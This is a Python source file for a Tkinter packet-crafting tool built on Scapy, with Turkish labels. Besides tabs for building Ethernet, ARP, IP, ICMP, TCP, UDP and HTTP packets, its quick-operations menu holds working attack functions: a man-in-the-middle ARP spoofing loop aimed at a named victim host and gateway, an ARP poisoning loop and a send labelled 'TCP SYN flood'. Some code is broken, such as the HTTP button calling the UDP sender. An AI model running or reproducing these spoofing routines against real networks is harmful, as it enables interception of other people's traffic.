#author _ibrahimakdag_
import sys
import tkinter as tk
from tkinter import filedialog as fd
from tkinter.ttk import *
from scapy.all import *
import os
import time

root = tk.Tk()
root.title("Paket Üretme Programı")
root.geometry("600x400+300+100")
running = True
def mitma():
    mitmSaldirisi = tk.Toplevel()
    mitmSaldirisi.geometry("300x200+300+100")
    label = Label(mitmSaldirisi,text="Hedef host(Kurban)")
    label.grid(row=0,sticky=tk.W)
    kurbanIP = tk.Text(mitmSaldirisi, width=15, height=1)
    kurbanIP.insert(tk.INSERT, "0.0.0.0")
    kurbanIP.grid(row=0, column=1)
	
    label = Label(mitmSaldirisi,text="Hedef MAC")
    label.grid(row=1,sticky=tk.W)
    kurbanMAC = tk.Text(mitmSaldirisi, width=17, height=1)
    kurbanMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
    kurbanMAC.grid(row=1, column=1)
	
    label = Label(mitmSaldirisi,text="Gateway IP")
    label.grid(row=2,sticky=tk.W)
    routerIP = tk.Text(mitmSaldirisi, width=15, height=1)
    routerIP.insert(tk.INSERT, "0.0.0.0")
    routerIP.grid(row=2, column=1)
    
    label = Label(mitmSaldirisi,text="Gateway MAC")
    label.grid(row=3,sticky=tk.W)
    routerMAC = tk.Text(mitmSaldirisi, width=17, height=1)
    routerMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
    routerMAC.grid(row=3, column=1)        
    def gonder():
        gateIP = routerIP.get(1.0, 1.15)
        victimIP = kurbanIP.get(1.0, 1.15)
        victimMAC = kurbanMAC.get(1.0, 1.17)
        gateMAC = routerMAC.get(1.0, 1.17)
        
        if running==True:
            send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gateMAC))
            send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= victimMAC))
            time.sleep(1.5)
            root.after(1000, gonder)
        if running==False:
            send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= "ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
            send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= "ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
            
            
    def start():
        global running
        running = True
        gonder()
    def stop():
        global running
        running = False
        gonder()
    butonGonder = tk.Button(mitmSaldirisi, text='Gönder', command=start).grid(row=4, sticky=tk.W)
    butonStop = tk.Button(mitmSaldirisi, text='Stop', command=stop).grid(row=4, column=1)

def donothing():
    ikinci = tk.Toplevel()
    l = tk.Label(ikinci, text="ibrahimakdag@outlook.com")
    l.pack(side="top", fill="both", expand=True, padx=100, pady=100)

def ARPpoisoning():
    arpzehri = tk.Toplevel()
    arpzehri.geometry("300x200+300+100")
    label = Label(arpzehri,text="Hedef host(Kurban)")
    label.grid(row=0,sticky=tk.W)
    kurbanci = tk.Entry(arpzehri)
    kurbanci.insert(tk.INSERT, "0.0.0.0")
    kurbanci.grid(row=0, column=1)
	
    label = Label(arpzehri,text="Gateway adresi")
    label.grid(row=2,sticky=tk.W)
    gatway = tk.Entry(arpzehri)
    gatway.insert(tk.INSERT, "0.0.0.0")
    gatway.grid(row=2, column=1)
    
    label = Label(arpzehri,text="Hedef MAC adres")
    label.grid(row=1,sticky=tk.W)
    kurbanciMAC = tk.Entry(arpzehri)
    kurbanciMAC.insert(tk.INSERT, "0.0.0.0")
    kurbanciMAC.grid(row=1, column=1)
    def gonder():
    
        paket = Ether(dst=kurbanciMAC.get())/ARP(op="who-has",psrc=gatway.get(),pdst=kurbanci.get())
        if running==True:
            sendp(paket)
            time.sleep(1.5)
        root.after(1000, gonder)
        if running==False:
            pass
    def start():
        global running
        running = True
        gonder()
    def stop():
        global running
        running = False
        gonder()
    butonGonder = tk.Button(arpzehri, text='Gönder', command=start).grid(row=3, sticky=tk.W)
    butonStop = tk.Button(arpzehri, text='Stop', command=stop).grid(row=3, column=1)
menubar = tk.Menu(root)
filemenu = tk.Menu(menubar, tearoff=0)
def gonderPCAP():
    dosyaadi = fd.askopenfilename()
    pcapci = tk.Toplevel()
    l = tk.Label(pcapci, text=dosyaadi)
    l.pack(side="top", fill="both", expand=True, padx=100, pady=100)
    def go():
        sendp(rdpcap(dosyaadi))
    butonGonder = tk.Button(pcapci, text='Gönder', command=go).pack()

filemenu.add_command(label="PCAP dosyasından gönder", command=gonderPCAP)


filemenu.add_separator()

filemenu.add_command(label="Çıkış", command=root.quit)
menubar.add_cascade(label="Dosya", menu=filemenu)
editmenu = tk.Menu(menubar, tearoff=0)
editmenu.add_command(label="Man in the middle", command=mitma)
editmenu.add_command(label="ARP zehirleme", command=ARPpoisoning)


def scanSYN():
    synscan = tk.Toplevel()
    synscan.geometry("300x200+300+100")
    label = Label(synscan,text="Hedef IP adres")
    label.grid(row=0,sticky=tk.W)
    hedef = tk.Text(synscan, width=15, height=1)
    hedef.insert(tk.INSERT, "0.0.0.0")
    hedef.grid(row=0, column=1)
	
    label = Label(synscan,text="Hedef Port")
    label.grid(row=1,sticky=tk.W)
    hedefport = tk.Text(synscan, width=15, height=1)
    hedefport.insert(tk.INSERT, "80")
    hedefport.grid(row=1, column=1)
    def gonder():
        buport, suport = hedefport.get(1.0,1.11).split("-")
        if(int(buport)<=65535 and int(buport)>=0 and int(suport)<=65535 and int(suport)>=0):
            send(IP(dst=hedef.get(1.0, 1.15))/TCP(dport=(int(buport), int(suport)), flags="S"))
    butonGonder = tk.Button(synscan, text='Gönder', command=gonder).grid(row=2, sticky=tk.W)


editmenu.add_command(label="TCP SYN flood", command=scanSYN)

def tracerouteTCP():
    traceroutetcp = tk.Toplevel()
    traceroutetcp.geometry("200x100+300+100")
    label = Label(traceroutetcp,text="Hedef IP adres")
    label.grid(row=0,sticky=tk.W)
    hedef = tk.Text(traceroutetcp, width=15, height=1)
    hedef.insert(tk.INSERT, "0.0.0.0")
    hedef.grid(row=0, column=1)

    def gonder():
        ans,unans=sr(IP(dst=hedef.get(1.0, 1.15),ttl=(0,25))/TCP(dport=53,flags="S"))
        ans.summary(lambda s,r: r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
    butonGonder = tk.Button(traceroutetcp, text='Gönder', command=gonder).grid(row=1, sticky=tk.W)
editmenu.add_command(label="TCP Traceroute", command=tracerouteTCP)

def pingUDP():
    pUDP = tk.Toplevel()
    pUDP.geometry("200x100+300+100")
    label = Label(pUDP,text="Hedef IP adres")
    label.grid(row=0,sticky=tk.W)
    hedef = tk.Entry(pUDP)
    hedef.insert(tk.INSERT, "0.0.0.0")
    hedef.grid(row=1, sticky=tk.W)
    hedefPort = tk.Entry(pUDP)
    hedefPort.insert(tk.INSERT, "80")
    hedefPort.grid(row=2, sticky=tk.W)
    def gonder():
        sr(IP(dst=hedef.get())/UDP(dport=int(hedefPort.get())))
    butonGonder = tk.Button(pUDP, text='Gönder', command=gonder).grid(row=3, sticky=tk.W)

editmenu.add_command(label="UDP ping", command=pingUDP)



menubar.add_cascade(label="Hızlı işlemler", menu=editmenu)
helpmenu = tk.Menu(menubar, tearoff=0)

helpmenu.add_command(label="Hakkında...", command=donothing)
menubar.add_cascade(label="Yardım", menu=helpmenu)

root.config(menu=menubar)



note = Notebook(root)

tab0 = Frame(note, width=500, height=300)
tab1 = Frame(note, width=500, height=300)
tab2 = Frame(note, width=500, height=300)
tab6 = Frame(note, width=500, height=300)
tab3 = Frame(note, width=500, height=300)
tab4 = Frame(note, width=500, height=300)
tab5 = Frame(note, width=500, height=300)
#butonE = tk.Button(root, text='Exit', command=root.destroy).pack()

note.add(tab0, text="Ethernet", compound=tk.TOP)


label = Label(tab0,text="Kaynak MAC")
label.grid(row=0, sticky=tk.W)
srcMAC = tk.Entry(tab0)
srcMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
srcMAC.grid(row=0, column=1)

label = Label(tab0,text="Hedef MAC")
label.grid(row=1,sticky=tk.W)
dstMAC = tk.Entry(tab0)
dstMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
dstMAC.grid(row=1, column=1)

label = Label(tab0,text="Tür")
label.grid(row=2,sticky=tk.W)
tur = tk.Entry(tab0)
tur.insert(tk.INSERT, "0x800")
tur.grid(row=2, column=1)

label = Label(tab0,text="Paket Sayısı")
label.grid(row=3,sticky=tk.W)
paketsEth = tk.Entry(tab0)
paketsEth.insert(tk.INSERT, "1")
paketsEth.grid(row=3, column=1)

label = Label(tab0,text="Paket Aralığı")
label.grid(row=4,sticky=tk.W)
paketaEth = tk.Entry(tab0)
paketaEth.insert(tk.INSERT, "0")
paketaEth.grid(row=4, column=1)

def gonderEthernet():
    kaynakMAC = srcMAC.get()
    hedefMAC = dstMAC.get()
    turEther = int(float.fromhex(tur.get()))
    paketSayisi = int(paketsEth.get())
    paketAraligi = int(paketaEth.get())
    ether = send(Ether(src=kaynakMAC, dst=hedefMAC, type=turEther), count=paketSayisi, inter=paketAraligi)
    if ether:
     ether.show()

butonGonder = tk.Button(tab0, text='Gönder', command=gonderEthernet).grid(row=6, sticky=tk.W)

note.add(tab1, text="ARP", compound=tk.TOP)


label = Label(tab1,text="Gönderici hardware")
label.grid(row=2, sticky=tk.W)
hwsrc = tk.Text(tab1, width=17, height=1)
hwsrc.insert(tk.INSERT, "00:00:00:00:00:00")
hwsrc.grid(row=2, column=1)

label = Label(tab1,text="Gönderici protokol adresi")
label.grid(row=3,sticky=tk.W)
psrc = tk.Text(tab1, width=15, height=1)
psrc.insert(tk.INSERT, "0.0.0.0")
psrc.grid(row=3, column=1)

label = Label(tab1,text="Hedef protokol adresi")
label.grid(row=4,sticky=tk.W)
pdst = tk.Text(tab1, width=15, height=1)
pdst.insert(tk.INSERT, "0.0.0.0")
pdst.grid(row=4, column=1)

label = Label(tab1,text="Hedef hardware")
label.grid(row=5,sticky=tk.W)
hwdst = tk.Text(tab1, width=17, height=1)
hwdst.insert(tk.INSERT, "00:00:00:00:00:00")
hwdst.grid(row=5, column=1)
#opcode unutma
label = Label(tab1,text="Opcode")
label.grid(row=6,sticky=tk.W)
opcodeARP = tk.Entry(tab1)
opcodeARP.insert(tk.INSERT, "2")
opcodeARP.grid(row=6, column=1)

label = Label(tab1,text="Paket Sayısı")
label.grid(row=7,sticky=tk.W)
paketsARP = tk.Entry(tab1)
paketsARP.insert(tk.INSERT, "1")
paketsARP.grid(row=7, column=1)

label = Label(tab1,text="Paket Aralığı")
label.grid(row=8,sticky=tk.W)
paketaARP = tk.Entry(tab1)
paketaARP.insert(tk.INSERT, "0")
paketaARP.grid(row=8, column=1)

def gonderARP():
   
    kaynakPA = psrc.get(1.0,1.15)
    hedefPA = pdst.get(1.0,1.15)
    kaynakHA = hwsrc.get(1.0,1.17)
    hedefHA = hwdst.get(1.0,1.17)
    opcode = int(opcodeARP.get())
    paketSayisi = int(paketsARP.get())
    paketAraligi = int(paketaARP.get())
    
    arp = sendp(Ether()/ARP(op=opcode, psrc=kaynakPA, hwdst=hedefHA, hwsrc=kaynakHA, pdst=hedefPA), count=paketSayisi, inter=paketAraligi)
    if arp:
     arp.show()
	 
butonGonder = tk.Button(tab1, text='Gönder', command=gonderARP).grid(row=9, sticky=tk.W)

note.add(tab2, text="IP")



labelk = Label(tab2,text="IP versiyon")
labelk.grid(row=2,sticky=tk.W)
versiyon = tk.Text(tab2, width=15, height=1)
versiyon.insert(tk.INSERT, "4")
versiyon.grid(row=2, column=1)

labelk = Label(tab2,text="Başlık uzunluğu")
labelk.grid(row=2, column=2, sticky=tk.W)
ibu = tk.Text(tab2, width=15, height=1)
ibu.insert(tk.INSERT, "4")
ibu.grid(row=2, column=3)

labelk = Label(tab2,text="Hizmet tipi")
labelk.grid(row=3,sticky=tk.W)
servisT = tk.Text(tab2, width=15, height=1)
servisT.insert(tk.INSERT, "4")
servisT.grid(row=3, column=1)

labelk = Label(tab2,text="Toplam uzunluk")
labelk.grid(row=3, column=2, sticky=tk.W)
toplamU = tk.Text(tab2, width=15, height=1)
toplamU.insert(tk.INSERT, "4")
toplamU.grid(row=3, column=3)

labelk = Label(tab2,text="Identification")
labelk.grid(row=4,sticky=tk.W)
idBilgisi = tk.Text(tab2, width=15, height=1)
idBilgisi.insert(tk.INSERT, "4")
idBilgisi.grid(row=4, column=1)

labelk = Label(tab2,text="Bayraklar")
labelk.grid(row=4, column=2, sticky=tk.W)
bayrak = tk.Text(tab2, width=1, height=1)
bayrak.insert(tk.INSERT, "4")
bayrak.grid(row=4, column=3)

labelk = Label(tab2,text="Fragment ofseti")
labelk.grid(row=5,sticky=tk.W)
parcaN = tk.Text(tab2, width=15, height=1)
parcaN.insert(tk.INSERT, "4")
parcaN.grid(row=5, column=1)

labelk = Label(tab2,text="Yaşam süresi")
labelk.grid(row=5, column=2, sticky=tk.W)
yasamS = tk.Text(tab2, width=15, height=1)
yasamS.insert(tk.INSERT, "4")
yasamS.grid(row=5, column=3)

labelk = Label(tab2,text="Protokol")
labelk.grid(row=6,sticky=tk.W)
protokol = tk.Text(tab2, width=15, height=1)
protokol.insert(tk.INSERT, "00")
protokol.grid(row=6, column=1)

labelk = Label(tab2,text="Header checksum")
labelk.grid(row=6, column=2, sticky=tk.W)
kontrol = tk.Text(tab2, width=15, height=1)
kontrol.insert(tk.INSERT, "36")
kontrol.grid(row=6, column=3)

labelk = Label(tab2,text="Kaynak IP adresi")
labelk.grid(row=7,sticky=tk.W)
kaynakIP = tk.Text(tab2, width=15, height=1)
kaynakIP.insert(tk.INSERT, "0.0.0.0")
kaynakIP.grid(row=7, column=1)

labelk = Label(tab2,text="Hedef IP adresi")
labelk.grid(row=7, column=2, sticky=tk.W)
hedefIP = tk.Text(tab2, width=15, height=1)
hedefIP.insert(tk.INSERT, "0.0.0.0")
hedefIP.grid(row=7, column=3)

labelk = Label(tab2,text="Seçenekler")
labelk.grid(row=8,sticky=tk.W)
secenek = tk.Text(tab2, width=15, height=1)
secenek.insert(tk.INSERT, "4")
secenek.grid(row=8, column=1)

label = Label(tab2,text="Paket Sayısı")
label.grid(row=9,sticky=tk.W)
paketsIP = tk.Entry(tab2)
paketsIP.insert(tk.INSERT, "1")
paketsIP.grid(row=9, column=1)

label = Label(tab2,text="Paket Aralığı")
label.grid(row=10,sticky=tk.W)
paketaIP = tk.Entry(tab2)
paketaIP.insert(tk.INSERT, "0")
paketaIP.grid(row=10, column=1)

def gonderIP():
    
    versionN = int(versiyon.get(1.0, 'end-1c'))
    internetBaslikU = int(ibu.get(1.0, 'end-1c'))
    servisTuru = int(servisT.get(1.0, 'end-1c'))
    toplamUzunluk = int(toplamU.get(1.0, 'end-1c'))
    kimlikBilgisi = int(idBilgisi.get(1.0, 'end-1c'))
    bayraklar = int(bayrak.get(1.0, 1.1))	
    parcaNo = int(parcaN.get(1.0, 'end-1c'))
    yasamSuresi = int(yasamS.get(1.0, 'end-1c'))
    protokolNo = int(protokol.get(1.0, 'end-1c'))
    kontrolB = int(kontrol.get(1.0, 'end-1c'))
    kaynakIPadres = kaynakIP.get(1.0, 1.15)
    hedefIPadres = hedefIP.get(1.0, 1.15)
    secenekler = int(secenek.get(1.0, 'end-1c'))
    paketSayisi = int(paketsIP.get())
    paketAraligi = int(paketaIP.get())
    #ip = send(Ether(src=kaynakMAC, dst=hedefMAC)/IP(options=IPOption()))
    #if ip:
     #p.show()
	
	
    ip = sendp(Ether()/IP(version=versionN, ihl=internetBaslikU, tos=servisTuru, len=toplamUzunluk, id=kimlikBilgisi, flags=bayraklar, frag=parcaNo, ttl=yasamSuresi, proto=protokolNo, chksum=kontrolB, src=kaynakIPadres, dst=hedefIPadres), count=paketSayisi, inter=paketAraligi)
    if ip:
     ip.show()

butonGonder = tk.Button(tab2, text='Gönder', command=gonderIP).grid(row=11, sticky=tk.W)

note.add(tab6, text="ICMP ")

labelk = Label(tab6,text="Hedef IP adresi")
labelk.grid(row=1, column=2, sticky=tk.W)
hedeffIP = tk.Text(tab6, width=15, height=1)
hedeffIP.insert(tk.INSERT, "0.0.0.0")
hedeffIP.grid(row=1, column=3)

labelk = Label(tab6,text="ICMP türü")
labelk.grid(row=2,sticky=tk.W)
typeICMP = tk.Text(tab6, width=15, height=1)
typeICMP.insert(tk.INSERT, "4")
typeICMP.grid(row=2, column=1)

labelk = Label(tab6,text="ICMP kod")
labelk.grid(row=2, column=2, sticky=tk.W)
codeICMP = tk.Text(tab6, width=15, height=1)
codeICMP.insert(tk.INSERT, "4")
codeICMP.grid(row=2, column=3)

labelk = Label(tab6,text="Checksum")
labelk.grid(row=3,sticky=tk.W)
chksumICMP = tk.Text(tab6, width=15, height=1)
chksumICMP.insert(tk.INSERT, "4")
chksumICMP.grid(row=3, column=1)

labelk = Label(tab6,text="Identification")
labelk.grid(row=3, column=2, sticky=tk.W)
idICMP = tk.Text(tab6, width=15, height=1)
idICMP.insert(tk.INSERT, "4")
idICMP.grid(row=3, column=3)

labelk = Label(tab6,text="Dizi numarası")
labelk.grid(row=4,sticky=tk.W)
secICMP = tk.Text(tab6, width=15, height=1)
secICMP.insert(tk.INSERT, "4")
secICMP.grid(row=4, column=1)

label = Label(tab6,text="Paket Sayısı")
label.grid(row=5,sticky=tk.W)
paketsICMP = tk.Entry(tab6)
paketsICMP.insert(tk.INSERT, "1")
paketsICMP.grid(row=5, column=1)

label = Label(tab6,text="Paket Aralığı")
label.grid(row=6,sticky=tk.W)
paketaICMP = tk.Entry(tab6)
paketaICMP.insert(tk.INSERT, "0")
paketaICMP.grid(row=6, column=1)

def gonderICMP():
    hedefffIP = hedeffIP.get(1.0, 1.15)
    typeeICMP = int(typeICMP.get(1.0, 'end-1c'))
    codeeICMP = int(codeICMP.get(1.0, 'end-1c'))
    chksummICMP = int(chksumICMP.get(1.0, 'end-1c'))
    iddICMP = int(idICMP.get(1.0, 'end-1c'))
    seqqICMP = int(secICMP.get(1.0, 'end-1c'))
    paketSayisi = int(paketsICMP.get())
    paketAraligi = int(paketaICMP.get())
    send(IP(dst=hedefffIP)/ICMP(type = typeeICMP, code = codeeICMP, chksum = chksummICMP, id= iddICMP, seq= seqqICMP), count=paketSayisi, inter=paketAraligi)

butonGonder = tk.Button(tab6, text='Gönder', command=gonderICMP).grid(row=7, sticky=tk.W)

note.add(tab3, text="TCP ")

labelk = Label(tab3,text="Hedef IP adresi")
labelk.grid(row=1, column=2, sticky=tk.W)
tcphedefIP = tk.Text(tab3, width=15, height=1)
tcphedefIP.insert(tk.INSERT, "0.0.0.0")
tcphedefIP.grid(row=1, column=3)


#tcp
labelk = Label(tab3,text="Kaynak port")
labelk.grid(row=2,sticky=tk.W)
kaynakPort = tk.Text(tab3, width=15, height=1)
kaynakPort.insert(tk.INSERT, "80")
kaynakPort.grid(row=2, column=1)

labelk = Label(tab3,text="Hedef port")
labelk.grid(row=2, column=2, sticky=tk.W)
hedefPort = tk.Text(tab3, width=15, height=1)
hedefPort.insert(tk.INSERT, "80")
hedefPort.grid(row=2, column=3)

labelk = Label(tab3,text="Dizi numarası")
labelk.grid(row=3,sticky=tk.W)
diziNo = tk.Text(tab3, width=15, height=1)
diziNo.insert(tk.INSERT, "25")
diziNo.grid(row=3, column=1)

labelk = Label(tab3,text="Alındı numarası")
labelk.grid(row=3, column=2, sticky=tk.W)
ackNo = tk.Text(tab3, width=15, height=1)
ackNo.insert(tk.INSERT, "26")
ackNo.grid(row=3, column=3)

labelk = Label(tab3,text="Data offset")
labelk.grid(row=4,sticky=tk.W)
dataOfseti = tk.Text(tab3, width=15, height=1)
dataOfseti.insert(tk.INSERT, "270")
dataOfseti.grid(row=4, column=1)

labelk = Label(tab3,text="Reserved")
labelk.grid(row=4, column=2, sticky=tk.W)
reservedT = tk.Text(tab3, width=15, height=1)
reservedT.insert(tk.INSERT, "0")
reservedT.grid(row=4, column=3)

labelk = Label(tab3,text="Bayraklar")
labelk.grid(row=5,sticky=tk.W)
bayrakT = tk.Text(tab3, width=15, height=1)
bayrakT.insert(tk.INSERT, "0")
bayrakT.grid(row=5, column=1)

labelk = Label(tab3,text="Pencere boyutu")
labelk.grid(row=5, column=2, sticky=tk.W)
pencereB = tk.Text(tab3, width=15, height=1)
pencereB.insert(tk.INSERT, "300")
pencereB.grid(row=5, column=3)

labelk = Label(tab3,text="TCP checksum")
labelk.grid(row=6,sticky=tk.W)
checksumT = tk.Text(tab3, width=15, height=1)
checksumT.insert(tk.INSERT, "0")
checksumT.grid(row=6, column=1)

labelk = Label(tab3,text="Urgent pointer")
labelk.grid(row=6, column=2, sticky=tk.W)
urgentP = tk.Text(tab3, width=15, height=1)
urgentP.insert(tk.INSERT, "0")
urgentP.grid(row=6, column=3)

labelk = Label(tab3,text="TCP seçenekler")
labelk.grid(row=7,sticky=tk.W)
secenekT = tk.Text(tab3, width=15, height=1)
secenekT.insert(tk.INSERT, "34")
secenekT.grid(row=7, column=1)

label = Label(tab3,text="Paket Sayısı")
label.grid(row=8,sticky=tk.W)
paketsTCP = tk.Entry(tab3)
paketsTCP.insert(tk.INSERT, "1")
paketsTCP.grid(row=8, column=1)

label = Label(tab3,text="Paket Aralığı")
label.grid(row=9,sticky=tk.W)
paketaTCP = tk.Entry(tab3)
paketaTCP.insert(tk.INSERT, "0")
paketaTCP.grid(row=9, column=1)

def gonderTCP():
    
    hedefIPadres = tcphedefIP.get(1.0, 1.15)
    secenekler = int(secenek.get(1.0, 'end-1c'))
    kaynakPortadres = int(kaynakPort.get(1.0, 'end-1c'))
    hedefPortadres = int(hedefPort.get(1.0, 'end-1c'))
    diziNumarasi = int(diziNo.get(1.0, 'end-1c'))
    ackNumarasi = int(ackNo.get(1.0, 'end-1c'))
    dataOffset = dataOfseti.get(1.0, 'end-1c')
    reservedAlani = reservedT.get(1.0, 'end-1c')
    bayraklarT = bayrakT.get(1.0, 'end-1c')
    pencereBoyutu = int(pencereB.get(1.0, 'end-1c'))
    checksumAlani = int(checksumT.get(1.0, 'end-1c'))
    urgentPointer = int(urgentP.get(1.0, 'end-1c'))
    seceneklerT = int(secenekT.get(1.0, 'end-1c'))
#dataofs=dataOffset, reserved=reservedAlani, flags=bayraklarT, options=seceneklerT
    paketSayisi = int(paketsTCP.get())
    paketAraligi = int(paketaTCP.get())
    if(checksumAlani==0 and urgentPointer==0):
        tcp = send(IP(dst=hedefIPadres)/TCP(sport=kaynakPortadres, dport=hedefPortadres, seq=diziNumarasi,\
ack=ackNumarasi, window=pencereBoyutu, urgptr=urgentPointer), count=paketSayisi, inter=paketAraligi)
    else:
        tcp = send(IP(dst=hedefIPadres)/TCP(sport=kaynakPortadres, dport=hedefPortadres, seq=diziNumarasi,\
ack=ackNumarasi, window=pencereBoyutu, chksum=checksumAlani, urgptr=urgentPointer), count=paketSayisi, inter=paketAraligi)
    


butonGonder = tk.Button(tab3, text='Gönder', command=gonderTCP).grid(row=10, sticky=tk.W)

#UDP

note.add(tab4, text="UDP")



labelk = Label(tab4,text="Hedef IP adresi")
labelk.grid(row=1, column=2, sticky=tk.W)
udphedefIP = tk.Text(tab4, width=15, height=1)
udphedefIP.insert(tk.INSERT, "0.0.0.0")
udphedefIP.grid(row=1, column=3)



#UDP
labelk = Label(tab4,text="Kaynak Port")
labelk.grid(row=2,sticky=tk.W)
kaynakPortU = tk.Text(tab4, width=15, height=1)
kaynakPortU.insert(tk.INSERT, "8080")
kaynakPortU.grid(row=2, column=1)

labelk = Label(tab4,text="Hedef Port")
labelk.grid(row=2, column=2, sticky=tk.W)
hedefPortU = tk.Text(tab4, width=15, height=1)
hedefPortU.insert(tk.INSERT, "80")
hedefPortU.grid(row=2, column=3)

labelk = Label(tab4,text="Uzunluk")
labelk.grid(row=3,sticky=tk.W)
uzunlukU = tk.Text(tab4, width=15, height=1)
uzunlukU.insert(tk.INSERT, "0")
uzunlukU.grid(row=3, column=1)

labelk = Label(tab4,text="Checksum")
labelk.grid(row=3, column=2, sticky=tk.W)
checksumU = tk.Text(tab4, width=15, height=1)
checksumU.insert(tk.INSERT, "0")
checksumU.grid(row=3, column=3)

label = Label(tab4,text="Paket Sayısı")
label.grid(row=4,sticky=tk.W)
paketsUDP = tk.Entry(tab4)
paketsUDP.insert(tk.INSERT, "1")
paketsUDP.grid(row=4, column=1)

label = Label(tab4,text="Paket Aralığı")
label.grid(row=5,sticky=tk.W)
paketaUDP = tk.Entry(tab4)
paketaUDP.insert(tk.INSERT, "0")
paketaUDP.grid(row=5, column=1)

def gonderUDP():
    
    hedefIPadres = udphedefIP.get(1.0, 1.15)
    secenekler = int(secenek.get(1.0, 'end-1c'))
    kaynakPortadresU = int(kaynakPortU.get(1.0, 'end-1c'))
    hedefPortadresU = int(hedefPortU.get(1.0, 'end-1c'))
    checksumUDP = int(checksumU.get(1.0, 'end-1c'))
    uzunlukUDP = int(uzunlukU.get(1.0, 'end-1c'))
    paketSayisi = int(paketsUDP.get())
    paketAraligi = int(paketaUDP.get())
    if(checksumUDP==0 and uzunlukUDP==0):
        udp = send(IP(dst=hedefIPadres)/UDP(sport=kaynakPortadresU,\
dport=hedefPortadresU), count=paketSayisi, inter=paketAraligi)
    else:
        udp = send(IP(dst=hedefIPadres)/UDP(sport=kaynakPortadresU,\
dport=hedefPortadresU, len=uzunlukUDP, chksum=checksumUDP), count=paketSayisi, inter=paketAraligi)


butonGonder = tk.Button(tab4, text='Gönder', command=gonderUDP).grid(row=6, sticky=tk.W)	 

var = tk.IntVar()
var2 = tk.IntVar()
var3 = tk.IntVar()
var4 = tk.IntVar()
def sel():
   if(var3.get()==5):
    R1.config(state=tk.NORMAL)
    R2.config(state=tk.NORMAL)
    
    if(var.get()==1):
     note.select(tab1)
    
    if(var.get()==2):
     R3.config(state=tk.NORMAL)
     R4.config(state=tk.NORMAL)
     R6.config(state=tk.NORMAL)
     note.select(tab2)
     if(var2.get()==3):
      R5.config(state=tk.NORMAL)
      note.select(tab3)
      if(var4.get()==7):
       
       note.select(tab5)
   
   if(var3.get()==5 and var.get()==2 and var2.get()==3):
    note.select(tab3)
   if(var3.get()==5 and var.get()==2 and var2.get()==4):
    note.select(tab4)
   if(var3.get()==6):
    R1.config(state=tk.DISABLED)
    R2.config(state=tk.DISABLED)
    R3.config(state=tk.DISABLED)
    R4.config(state=tk.DISABLED)
    R5.config(state=tk.DISABLED)
    var.set(0)
    var2.set(0)
    var3.set(0)
    var4.set(0)

Separator(root, orient='horizontal').grid(column=0, row=0, columnspan=4, sticky=tk.W)
R12 = Radiobutton(root, text="Ethernet", variable=var3, value=5, command=sel)
R12.grid(row=1, sticky=tk.W)

R13 = Radiobutton(root, text="Non", variable=var3, value=6, command=sel)
R13.grid(row=2, sticky=tk.W)
	
R1 = Radiobutton(root, text="ARP", variable=var, value=1, command=sel)
R1.grid(row=1, column=1, sticky=tk.W)
R1.config(state=tk.DISABLED)

R2 = Radiobutton(root, text="IP", variable=var, value=2, command=sel)
R2.grid(row=2, column=1, sticky=tk.W)
R2.config(state=tk.DISABLED)

R6 = Radiobutton(root, text="ICMP", variable=var2, value=8, command=sel)
R6.grid(row=3, column=2, sticky=tk.W)
R6.config(state=tk.DISABLED)

R3 = Radiobutton(root, text="TCP", variable=var2, value=3, command=sel)
R3.grid(row=1, column=2, sticky=tk.W)
R3.config(state=tk.DISABLED)

R4 = Radiobutton(root, text="UDP", variable=var2, value=4, command=sel)
R4.grid(row=2, column=2, sticky=tk.W)
R4.config(state=tk.DISABLED)

R5 = Radiobutton(root, text="HTTP", variable=var4, value=7, command=sel)
R5.grid(row=1, column=3, sticky=tk.W)
R5.config(state=tk.DISABLED)

note.add(tab5, text="HTTP")


labelk = Label(tab5,text="Hedef IP adresi")
labelk.grid(row=1, column=2, sticky=tk.W)
httphedefIP = tk.Text(tab5, width=15, height=1)
httphedefIP.insert(tk.INSERT, "0.0.0.0")
httphedefIP.grid(row=1, column=3)


labelk = Label(tab5,text="HTTP alanı")
labelk.grid(row=2, column=1, sticky=tk.W)
httpalani = tk.Text(tab5, width=30, height=10)
httpalani.insert(tk.INSERT, "GET / HTTP/1.0")
httpalani.grid(row=3, column=1)

def gonderHTTP():

    send(IP(dst=httphedefIP.get(1.0, 'end-1c'))/TCP(dport=80)/b(httpalani.get(1.0, 'end-1c')))

butonGonder = tk.Button(tab5, text='Gönder', command=gonderUDP).grid(row=4, sticky=tk.W)
note.grid(row=0, columnspan=3)

#root.grid_columnconfigure(0,weight=1)
root.mainloop()

